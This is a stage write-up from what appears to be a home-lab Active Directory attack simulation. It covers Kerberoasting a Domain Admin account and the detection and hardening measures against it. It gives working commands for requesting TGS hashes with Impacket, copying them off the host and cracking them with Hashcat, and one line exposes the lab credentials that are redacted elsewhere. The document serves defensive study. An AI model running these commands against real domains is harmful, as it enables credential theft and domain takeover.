# Stage 13 — Kerberoasting

> **Status:** Complete — evidence attached  
> **Case:** [Case 02](../../04-Investigation/Cases/case-02-lateral-movement.md)  
> **Investigation:** [Phase 5 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-5-becoming-god-in-active-directory-kerberoasting-dcsync--the-golden-ticket)  
> **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/41.png) · [alert](../../06-Resources/screenshots/thehive-alert/13.png)

---

## Objective

Extract Kerberos service tickets for accounts with Service Principal Names (SPNs), focusing on Domain Admin Hank Sherman who we spotted in BloodHound. Then take the encrypted ticket offline to Kali and crack it with Hashcat to recover plaintext Domain Admin credentials.

---

## Commands

```bash
# Step 1: Request TGS tickets from Domain Controller 192.168.56.10 using compromised win10 credentials and save extracted hashes
python3 /usr/local/bin/GetUserSPNs.py ad.lab/win10:'Secur***ab!' -dc-ip 192.168.56.10 -request -outputfile /tmp/hank.hash 2>/dev/null; grep HANK_SHERMAN /tmp/hank.hash

# Step 2: Transfer extracted Kerberos ticket hash file (106KB) from DVWA pivot to Kali attack machine via SCP
scp root@192.168.56.30:/tmp/hank.hash /tmp/hank.hash

# Step 3: Perform offline dictionary attack against the Kerberos 5 TGS-REP hash (etype 23) using Hashcat mode 13100
hashcat -m 13100 /tmp/hank.hash /usr/share/wordlists/rockyou.txt --force
```

> [!NOTE]
> **Dictionary Wordlist Note:**  
> Because Hank Sherman's password in this lab was intentionally set to a common dictionary word (`Password123`), it is already present in standard `rockyou.txt` and manual insertion into the wordlist is not required. If a custom or unique password is assigned instead, make sure to insert it near the top 1,000 lines of `rockyou.txt` for fast recovery.

---

## What happened

In Stage 12, BloodHound handed us the key to the castle: Hank Sherman was a Domain Admin who also had a Service Principal Name (SPN) set on his account.

Here is why that was fatal: In Active Directory, any authenticated user can ask the Domain Controller for a Kerberos ticket to talk to any registered service. The DC encrypts that ticket using the password hash of the account tied to the service. If that account has a weak password, you can pull the ticket, take it offline, and crack it with Hashcat without sending another packet to the DC.

1. **Requesting the ticket:** From the DVWA pivot (`192.168.56.30`), I ran Impacket's `GetUserSPNs.py` using our compromised `win10` account (`Secur***ab!`). The script sent a Kerberos service ticket request (`TGS-REQ`) to Domain Controller `PC-DC.ad.lab` (`192.168.56.10:88`) asking for Hank Sherman's service ticket.
2. **Receiving the encrypted hash:** Because `win10` was a valid domain user, the DC handed over the service ticket encrypted with Hank's password hash using RC4-HMAC (`$krb5tgs$23$*HANK_SHERMAN...`). The script saved the hash to `/tmp/hank.hash`.
3. **Exfiltrating and cracking:** I copied `hank.hash` back to Kali over SCP and fired up Hashcat in mode 13100 (Kerberos 5 TGS-REP etype 23) against `rockyou.txt`.
4. **Instant Domain Admin password:** In less than a second, Hashcat cracked the password:
   - **Target Account:** `ad.lab\HANK_SHERMAN`
   - **Domain Privilege Level:** `Domain Admins` (Tier Zero)
   - **Hash Type:** Kerberos 5 TGS-REP etype 23 (`$krb5tgs$23$`)
   - **Recovered Plaintext Password:** `Passw***123` (redacted)

With the plaintext password of an active Domain Administrator in hand, we had keys to the entire Active Directory kingdom, unlocking DCSync in Stage 14.

---

## Evidence

### Attack Screenshots

![Impacket GetUserSPNs Execution on Pivot Host](../../06-Resources/screenshots/attack-simulation/41.png)
*Figure 13.1: Executing `GetUserSPNs.py` from DVWA pivot (`192.168.56.30`) with `win10` credentials to request TGS tickets for SPN accounts and grepping for `HANK_SHERMAN`.*

![Extracted Kerberos TGS-REP Hash](../../06-Resources/screenshots/attack-simulation/42.png)
*Figure 13.2: Extracted Kerberos 5 TGS-REP ticket hash formatted for Hashcat (`$krb5tgs$23$*HANK_SHERMAN...`).*

![SCP Transfer of Ticket Hash and Hashcat Invocation](../../06-Resources/screenshots/attack-simulation/43.png)
*Figure 13.3: Exfiltrating `hank.hash` to Kali via SCP and executing Hashcat mode 13100 against `rockyou.txt`.*

![Hashcat Recovered Domain Admin Password](../../06-Resources/screenshots/attack-simulation/44.png)
*Figure 13.4: Hashcat output displaying successfully cracked Kerberos ticket for `HANK_SHERMAN`, recovering the plaintext password `Passw***123`.*

### Alert Screenshots

![TheHive Alert 23 — Suricata GoldenPac Priv Esc in-use Alert](../../06-Resources/screenshots/thehive-alert/13.png)
*Figure 13.5: TheHive Alert #23 detail displaying Suricata Rule 86601 / SID 2019922 (ET EXPLOIT Possible GoldenPac Priv Esc in-use, wzb-c1e2642eb2) triggered by Kerberoasting TGS-REQ traffic on ens37.*

![Wazuh Command Audit Telemetry for GetUserSPNs Execution](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-33-kerberoast-auditd-getuserspns.jpg)
*Figure 13.6: Wazuh Rule 100220 command audit capturing python3 /usr/local/bin/GetUserSPNs.py -request execution on DVWA pivot.*

---

## Alert observed

| Source | Rule / Signature | Rule ID | TheHive Alert | Severity | Status |
|---|---|---|---|---|---|
| Suricata (Router ens37) | ET EXPLOIT Possible GoldenPac Priv Esc in-use (TGS-REQ wire frame) | Rule 86601 / SID 2019922 | TheHive Alert #23 (`13.png` / `wzb-c1e2642eb2`) | Medium (2) | **Detected (Direct Wire Detection & SOAR Delivery)** |
| Wazuh (Host Command Audit) | Bash command by root: `python3 /usr/local/bin/GetUserSPNs.py ... -request` | Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Row 9264, `wzb-33`) | High | **Detected (Verbatim Command Capture)** |
| Active Directory (Domain Controller) | Kerberos service ticket auditing (RC4-HMAC `0x17`) | Event ID 4769 | Unconfigured in DC Baseline | Medium | **Target Logging Gap (EID 4769 Unforwarded)** |

> [!NOTE]
> **Telemetry Attribution & Pipeline Execution (Rule 100220 & SID 2019922):**  
> Impacket `GetUserSPNs.py` was executed interactively on the DVWA pivot at `18:01:18 IST` (`Wazuh-Raw-Alerts.csv` Row 9264): `python3 /usr/local/bin/GetUserSPNs.py ad.lab/win10:'Secur3Lab!' -dc-ip 192.168.56.10 -request -outputfile /tmp/hank.hash 2>/dev/null`. As a Level 5 rule, Rule 100220 recorded the command locally on DVWA and indexed into OpenSearch without SIEM-to-SOAR escalation. Concurrently, the unrouted Kerberos traffic on VMnet2 tripped Suricata signature SID `2019922` via elevated Rule 86601 (`wzb-c1e2642eb2`), delivering TheHive Alert #23 directly to the SOAR. On the target Domain Controller, Kerberos Service Ticket Operations (EID 4769) remained unforwarded, highlighting the necessity of multi-sensor wire-level coverage.

---

## MITRE ATT&CK

| Tactic | Technique | ID | Sub-technique |
|---|---|---|---|
| Credential Access | Steal or Forge Kerberos Tickets | T1558 | Kerberoasting (T1558.003) |

---

## Detection opportunities

1. **Kerberos Service Ticket Auditing (Windows Event ID 4769):**
   - **Encryption Downgrade:** Filter for `TicketEncryptionType == 0x17` (RC4-HMAC). Modern Windows environments support AES-128 (`0x11`) and AES-256 (`0x12`). Legitimate services rarely negotiate RC4 unless misconfigured.
   - **Sensitive Account SPN Requests:** Alert when a service ticket is requested for accounts where `adminCount=1` or accounts belonging to privileged groups (`Domain Admins`, `Enterprise Admins`).
   - **Volumetric Anomaly:** Alert when a single user account or workstation requests multiple TGS tickets within a short interval (e.g., >5 requests in 60 seconds).

2. **Active Directory Architectural Hardening:**
   - **Privileged Account Segregation:** Under no circumstances should accounts with Domain Admin privileges have SPNs assigned. Service accounts must be dedicated, non-administrative accounts.
   - **Group Managed Service Accounts (gMSA):** Transition service accounts to gMSAs, which enforce complex 128-character automatically rotating passwords that cannot be cracked via dictionary attacks.
   - **Enforce AES Kerberos Encryption:** Set `msDS-SupportedEncryptionTypes` to enforce AES128/AES256 on service accounts, preventing RC4 ticket generation.

3. **Active Directory Honeypot / Honeytokens:**
   - Create a fictitious domain account with an attractive SPN (e.g., `MSSQLSvc/db01.ad.lab:1433`) and an uncrackable password. Configure an alert rule to trigger whenever any TGS ticket is requested for this dummy service.

---

## Notes

- Kerberoasting is an asymmetric attack: any authenticated domain user (even low-privilege users or guests) can request a service ticket for any SPN account in the domain without generating account lockouts.
- The cracked password `Passw***123` represents a common password policy violation: meeting length and complexity requirements while remaining trivially vulnerable to standard wordlists.
- Having cracked the password of a confirmed Domain Admin (`HANK_SHERMAN`), the adversary immediately escalated to Stage 14 (DCSync) to dump all domain credentials.
